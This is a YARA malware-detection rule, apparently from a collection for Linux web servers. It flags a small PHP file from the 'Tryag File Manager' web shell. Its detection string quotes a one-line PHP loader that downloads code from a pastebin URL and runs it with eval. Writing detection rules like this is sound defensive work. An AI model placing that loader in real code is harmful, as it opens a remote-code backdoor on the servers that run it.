rule _media_brian_88D1_7DB91_infected_07_14_18_Tryag_File_Manager_jpeg_master_x7 {
  meta:
    description = "Tryag-File-Manager-jpeg-master - file x7.php"
    author      = "Brian Laskowski"
    reference   = "https://github.com/Hestat/lw-yara"
    date        = "2018-07-14"
    hash1       = "6f6af1bc060e8030567dd30b1ec669872b0c4cb4bea3cd333949f6f4a2135acd"

  strings:
    $x1 = "<?php eval(\"?>\".file_get_contents(\"https://pastebin.com/raw/jAqZ3cxT\"));" fullword ascii

  condition:
    (uint16(0) == 0x3f3c and
      filesize < 1KB and
      (1 of ($x*))
    ) or (all of them)
}